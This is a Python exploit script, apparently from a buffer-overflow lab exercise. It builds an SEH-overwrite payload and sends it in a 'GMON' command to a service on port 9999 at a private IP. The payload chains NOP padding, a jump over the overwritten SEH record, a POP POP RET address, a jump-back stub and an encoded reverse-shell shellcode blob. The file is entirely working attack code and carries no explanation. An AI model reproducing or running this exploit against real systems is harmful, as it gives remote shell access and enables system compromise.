import socket

JUMP_INSTR = b"\xEB"
JUMP_OFFSET = b"\x06"
NOP = b"\x90"
SEH = b"\xB4\x10\x50\x62"
JUMP_BACK_INSTR = b"\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1"
REVERSE_SHELL_EXPLOIT = (b""
b"\xda\xc7\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x52\xba\xd9"
b"\x4f\x0c\x7b\x83\xe8\xfc\x31\x50\x13\x03\x89\x5c\xee"
b"\x8e\xd5\x8b\x6c\x70\x25\x4c\x11\xf8\xc0\x7d\x11\x9e"
b"\x81\x2e\xa1\xd4\xc7\xc2\x4a\xb8\xf3\x51\x3e\x15\xf4"
b"\xd2\xf5\x43\x3b\xe2\xa6\xb0\x5a\x60\xb5\xe4\xbc\x59"
b"\x76\xf9\xbd\x9e\x6b\xf0\xef\x77\xe7\xa7\x1f\xf3\xbd"
b"\x7b\x94\x4f\x53\xfc\x49\x07\x52\x2d\xdc\x13\x0d\xed"
b"\xdf\xf0\x25\xa4\xc7\x15\x03\x7e\x7c\xed\xff\x81\x54"
b"\x3f\xff\x2e\x99\x8f\xf2\x2f\xde\x28\xed\x45\x16\x4b"
b"\x90\x5d\xed\x31\x4e\xeb\xf5\x92\x05\x4b\xd1\x23\xc9"
b"\x0a\x92\x28\xa6\x59\xfc\x2c\x39\x8d\x77\x48\xb2\x30"
b"\x57\xd8\x80\x16\x73\x80\x53\x36\x22\x6c\x35\x47\x34"
b"\xcf\xea\xed\x3f\xe2\xff\x9f\x62\x6b\x33\x92\x9c\x6b"
b"\x5b\xa5\xef\x59\xc4\x1d\x67\xd2\x8d\xbb\x70\x15\xa4"
b"\x7c\xee\xe8\x47\x7d\x27\x2f\x13\x2d\x5f\x86\x1c\xa6"
b"\x9f\x27\xc9\x69\xcf\x87\xa2\xc9\xbf\x67\x13\xa2\xd5"
b"\x67\x4c\xd2\xd6\xad\xe5\x79\x2d\x26\xca\xd6\x75\x36"
b"\xa2\x24\x85\x27\x6f\xa0\x63\x2d\x9f\xe4\x3c\xda\x06"
b"\xad\xb6\x7b\xc6\x7b\xb3\xbc\x4c\x88\x44\x72\xa5\xe5"
b"\x56\xe3\x45\xb0\x04\xa2\x5a\x6e\x20\x28\xc8\xf5\xb0"
b"\x27\xf1\xa1\xe7\x60\xc7\xbb\x6d\x9d\x7e\x12\x93\x5c"
b"\xe6\x5d\x17\xbb\xdb\x60\x96\x4e\x67\x47\x88\x96\x68"
b"\xc3\xfc\x46\x3f\x9d\xaa\x20\xe9\x6f\x04\xfb\x46\x26"
b"\xc0\x7a\xa5\xf9\x96\x82\xe0\x8f\x76\x32\x5d\xd6\x89"
b"\xfb\x09\xde\xf2\xe1\xa9\x21\x29\xa2\xca\xc3\xfb\xdf"
b"\x62\x5a\x6e\x62\xef\x5d\x45\xa1\x16\xde\x6f\x5a\xed"
b"\xfe\x1a\x5f\xa9\xb8\xf7\x2d\xa2\x2c\xf7\x82\xc3\x64")

buffer = NOP * (3529 - len(REVERSE_SHELL_EXPLOIT))	# Padding
buffer += REVERSE_SHELL_EXPLOIT
buffer += NOP * 20	# Padding
buffer += JUMP_INSTR + JUMP_OFFSET + NOP * 2	# Jump instrunction in order to pass our SEH address 
buffer += SEH	# Points to a POP POP RET address!
buffer += JUMP_BACK_INSTR # Jump up 256 * 3 bytes in stack
buffer += b"\x90" * (10000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.88.130", 9999))
banner = s.recv(1024)

print(banner.decode())

exploit = b"GMON /." + buffer + b"\r\n"

s.send(exploit)
s.close()